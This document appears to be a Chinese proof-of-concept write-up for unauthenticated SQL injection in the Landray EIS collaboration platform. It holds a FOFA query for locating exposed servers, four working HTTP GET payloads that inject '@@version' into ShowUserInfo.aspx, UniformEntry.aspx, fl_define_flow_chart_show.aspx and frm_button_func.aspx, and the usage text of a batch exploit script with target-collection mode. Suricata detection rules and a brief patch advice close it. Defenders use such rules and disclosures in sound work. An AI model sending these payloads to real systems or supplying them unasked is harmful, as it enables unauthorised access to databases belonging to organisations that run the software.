### 产品简介  
蓝凌EIS智慧协同平台是一款专为企业提供高效协同办公和团队合作的产品。该平台集成了各种协同工具和功能，旨在提升企业内部沟通、协作和信息共享的效率。  

### 漏洞概述  
由于蓝凌EIS智慧协同平台ShowUserInfo.aspx、frm_button_func.aspx、UniformEntry.aspx、fl_define_flow_chart_show.aspx接口处未对用户输入的SQL语句进行过滤或验证导致出现SQL注入漏洞，未经身份验证的攻击者可以利用此漏洞获取数据库敏感信息。  

### 指纹识别  
fofa: app="Landray-EIS智慧协同平台"  

![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E8%93%9D%E5%87%8C/Lanling_EIS_SQL_injection/1.png)
![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E8%93%9D%E5%87%8C/Lanling_EIS_SQL_injection/2.png)
![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E8%93%9D%E5%87%8C/Lanling_EIS_SQL_injection/3.png)
![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E8%93%9D%E5%87%8C/Lanling_EIS_SQL_injection/4.png)

### 漏洞利用  
```
poc:
一、
GET /third/DingTalk/Demo/ShowUserInfo.aspx?account=1'%20and%201=@@version--+ HTTP/1.1
Host: your_ip
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
 
 
 
二、
GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1%20and%201=@@version--+ HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
 
 
 
三、
GET /flow/fl_define_flow_chart_show.aspx?id=1%20and%201=@@version--+ HTTP/1.1
Host: your_ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
 
 
 
四、
GET /frm/frm_button_func.aspx?formid=1%20and%201=@@version--+ HTTP/1.1
Host: your_ip
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
```

### 测试和利用脚本  
```
python3 Lanling_EIS_SQL_injection.py -h          
usage: Lanling_EIS_SQL_injection.py [-h] [-t] [-r FILE] [-u URL]

### Lanling EIS Smart Collaboration Platform frm_ Button_ Func.aspx has an SQL injection vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python Lanling_EIS_SQL_injection.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python Lanling_EIS_SQL_injection.py -u http://xxx.xxx.xxx
```

### 修复建议  
1.联系相关软件厂商更新至最新安全版本。  

### Suricata rules  
```
alert http any any -> any any (msg:"Lanling EIS Smart Collaboration Platform frm_Button_Func.aspx has an SQL injection vulnerability."; flow:established,to_server; flowbits:set,Lanling_EIS_sqlin; content:"get";http_method;nocase; content:"/frm/frm_button_func.aspx?formid=";http_uri;fast_pattern;nocase; pcre:"/formid=.*?and.*?=/Ui"; pcre:"/(?:S(?:HOW.+(?:C(?:HARACTER.+SET|UR(DATE|TIME))|(?:VARI|T)ABLES)|ELECT.+(?:FROM|USER))|U(?:NION.+SELEC|PDATE.+SE)T|DELETE.+FROM|INSERT.+INTO|@@version|system_user|suser_sname\(|user|db_name\()/"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E8%93%9D%E5%87%8C/Lanling_EIS_SQL_injection; classtype:web-attck; metadata:created_at 2024-01-15,updated_at 2024-01-15,creater:YUUKI4O4; sid:12; rev:1;)
alert http any any -> any any (msg:"Lanling EIS Smart Collaboration Platform ShowUserInfo.aspx has an SQL injection vulnerability."; flow:established,to_server; flowbits:set,Lanling_EIS_sqlin; content:"get";http_method;nocase; content:"/third/DingTalk/Demo/ShowUserInfo.aspx?account=";http_uri;fast_pattern;nocase; pcre:"/account=.*?and.*?=/Ui"; pcre:"/(?:S(?:HOW.+(?:C(?:HARACTER.+SET|UR(DATE|TIME))|(?:VARI|T)ABLES)|ELECT.+(?:FROM|USER))|U(?:NION.+SELEC|PDATE.+SE)T|DELETE.+FROM|INSERT.+INTO|@@version|system_user|suser_sname\(|user|db_name\()/"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E8%93%9D%E5%87%8C/Lanling_EIS_SQL_injection; classtype:web-attck; metadata:created_at 2024-01-15,updated_at 2024-01-15,creater:YUUKI4O4; sid:13; rev:1;)
alert http any any -> any any (msg:"Lanling EIS Smart Collaboration Platform UniformEntry.aspx has an SQL injection vulnerability."; flow:established,to_server; flowbits:set,Lanling_EIS_sqlin; content:"get";http_method;nocase; content:"/third/DingTalk/Pages/UniformEntry.aspx?moduleid=";http_uri;fast_pattern;nocase; pcre:"/moduleid=.*?and.*?=/Ui"; pcre:"/(?:S(?:HOW.+(?:C(?:HARACTER.+SET|UR(DATE|TIME))|(?:VARI|T)ABLES)|ELECT.+(?:FROM|USER))|U(?:NION.+SELEC|PDATE.+SE)T|DELETE.+FROM|INSERT.+INTO|@@version|system_user|suser_sname\(|user|db_name\()/"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E8%93%9D%E5%87%8C/Lanling_EIS_SQL_injection; classtype:web-attck; metadata:created_at 2024-01-15,updated_at 2024-01-15,creater:YUUKI4O4; sid:14; rev:1;)
alert http any any -> any any (msg:"Lanling EIS Smart Collaboration Platform fl_define_flow_chart_show.aspx has an SQL injection vulnerability."; flow:established,to_server; flowbits:set,Lanling_EIS_sqlin; content:"get";http_method;nocase; content:"/flow/fl_define_flow_chart_show.aspx?id=";http_uri;fast_pattern;nocase; pcre:"/\?id=.*?and.*?=/Ui"; pcre:"/(?:S(?:HOW.+(?:C(?:HARACTER.+SET|UR(DATE|TIME))|(?:VARI|T)ABLES)|ELECT.+(?:FROM|USER))|U(?:NION.+SELEC|PDATE.+SE)T|DELETE.+FROM|INSERT.+INTO|@@version|system_user|suser_sname\(|user|db_name\()/"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E8%93%9D%E5%87%8C/Lanling_EIS_SQL_injection; classtype:web-attck; metadata:created_at 2024-01-15,updated_at 2024-01-15,creater:YUUKI4O4; sid:15; rev:1;)
alert http any any -> any any (msg:"Lanling EIS Smart Collaboration Platform SQL injection vulnerability Success."; flow:established,from_server; flowbits:isset,Lanling_EIS_sqlin; content:"500";http_stat_code; content:"nvarchar";nocase;http_server_body; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E8%93%9D%E5%87%8C/Lanling_EIS_SQL_injection; classtype:web-attck; metadata:created_at 2024-01-15,updated_at 2024-01-15,creater:YUUKI4O4; sid:16; rev:1;)
```
